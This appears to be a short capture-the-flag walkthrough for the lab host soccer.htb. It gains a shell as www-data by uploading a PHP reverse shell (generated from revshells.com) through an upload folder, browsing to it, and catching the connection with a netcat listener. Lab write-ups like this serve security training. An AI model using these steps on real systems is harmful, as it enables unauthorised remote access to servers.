# Reverse Shell as www-data

Generate a PHP reverse shell.

Reference:

```text
https://www.revshells.com/
```

Start a listener:

```bash
nc -lvnp 4443
```

Upload the PHP reverse shell:

```text
rev.php
```

Browse to:

```text
http://soccer.htb/tiny/uploads/rev.php
```

The listener receives a connection.

Verify access:

```bash
whoami
```

Output:

```text
www-data
```

Initial foothold obtained.

